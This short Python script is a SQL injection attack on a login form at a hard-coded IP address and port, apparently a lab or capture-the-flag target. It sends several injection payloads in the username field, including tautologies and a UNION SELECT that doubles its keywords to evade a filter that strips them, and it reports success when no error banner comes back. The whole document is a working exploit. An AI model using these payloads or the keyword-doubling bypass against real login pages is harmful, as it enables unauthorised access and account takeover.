import requests

# Define the target URL
url = 'http://140.115.59.7:12005/'  # Replace 'your_website_url_here' with the actual URL

# Set your username and password
# username = '''AND 1=1--'''
# password = '''AND 1=1--'''

# username = '''' or '1'='1'''
# password = '''' or '1'='1'''

# username = '''idtjohn88'''
# password = '''' or '1'='1'''

username = '''' uniounionn selecselectt NULL, 'idtjohn88', 'z'-- '''
password = '''z'''


# Craft the POST request data
data = {
    'username': username,
    'password': password,
    'submit': 'ログイン'  # Replace with the appropriate button text if needed
}

# Send the POST request
response = requests.post(url, data=data)

# Check if the login status message is present in the response HTML
if 'alert alert-danger d-flex align-items-center' in response.text:
    # If the login status message is found, print it
    print("Login failed: Invalid username or password")
else:
    # If the login status message is not found, consider the login successful
    print("SQL Injection successful!")
